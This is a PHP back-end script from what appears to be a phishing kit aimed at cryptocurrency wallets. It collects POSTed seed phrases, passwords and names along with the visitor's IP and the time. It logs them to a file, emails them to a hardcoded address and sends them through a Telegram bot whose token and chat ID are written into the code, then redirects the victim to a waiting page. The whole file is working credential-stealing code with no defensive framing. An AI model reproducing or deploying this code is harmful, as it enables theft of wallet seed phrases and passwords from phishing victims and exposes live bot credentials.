<?php
// Configure your email and Telegram bot
$yourEmail = "danyellekurtz.conway@outlook.com";
$botToken = "7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg";
$chatId = "7296145278";

// Capture the current timestamp
$infoDate = date("d-m-Y h:i:sa");
$ipAddress = $_SERVER['REMOTE_ADDR'] ?? "Unknown IP";
$geoIpLink = "http://www.geoiptool.com/?IP=" . $ipAddress;

// Initialize $message to collect logs
$message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Process data based on available fields
    if (isset($_POST['pass'])) {
        $_SESSION['pass'] = $_POST['pass'];
        $message .= "[🔐 Seed Phrase]: {$_SESSION['pass']}\n";
    } elseif (isset($_POST['password'])) {
        $_SESSION['password'] = $_POST['password'];
        $message .= "[🔐 Password]: {$_SESSION['password']}\n";
    } elseif (isset($_POST['name'])) {
        $_SESSION['name'] = $_POST['name'];
        $message .= "[📛 Name]: {$_SESSION['name']}\n";
    }

    // Append IP and timestamp details
    $message .= "[🌍 IP INFO]: $geoIpLink\n[⏰ TIME/DATE]: $infoDate\n";

    // Log to a local file
    $logFile = __DIR__ . '/logs.txt';
    file_put_contents($logFile, $message, FILE_APPEND | LOCK_EX);

    // Send to email
    mail($yourEmail, "Log Entry", $message);

    // Send to Telegram
    sendToTelegram($botToken, $chatId, $message);

    // Redirect or output success
    header("Location: ./Waiting.html");
    exit;
} else {
    echo "No POST data received.";
}

/**
 * Send a message to Telegram
 */
function sendToTelegram($botToken, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

    $response = curl_exec($ch);
    if ($response === false) {
        error_log("Telegram API Error: " . curl_error($ch));
    }
    curl_close($ch);
}
?>
